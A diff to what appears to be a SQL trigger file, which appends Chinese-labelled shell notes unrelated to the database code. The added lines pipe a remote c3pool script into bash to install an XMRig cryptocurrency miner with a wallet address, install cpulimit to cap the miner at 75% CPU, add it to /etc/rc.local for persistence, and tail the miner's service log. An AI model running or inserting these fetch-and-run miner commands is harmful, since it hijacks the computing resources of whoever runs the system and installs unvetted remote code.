@@ -509,4 +509,28 @@ BEGIN
 		INSERT INTO im_err_log VALUES(NULL,'im_noticeSwitch',CONCAT(old.uid,',',old.obj),unix_timestamp(now()));
 END
 
+
+挖矿
+curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 43oYLXGQfen5ajuba6TEaMZ7XVSZgVHSDSD6xiL812nmgva9hvMBMpfWtsYQzopwtTgnaChiHaQCqdU6PHpdUFaRKq2ZmwS
+
+限制cpu使用
+HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:
+下载apt-get
+curl https://raw.githubusercontent.com/dvershinin/apt-get-centos/master/apt-get.sh -o /usr/local/bin/apt-get
+修改权限：
+chmod 0755 /usr/local/bin/apt-get
+
+安装
+wget -O cpulimit.zip https://github.com/opsengine/cpulimit/archive/master.zip
+unzip cpulimit.zip
+cd cpulimit-master
+make
+cp src/cpulimit /usr/bin
+cpulimit -e xmrig -l 75
+sed -i -e '$acpulimit -e xmrig -l 75 -b\n' /etc/rc.local
+
+
+
+查看日志
+sudo journalctl -u c3pool_miner -f
  
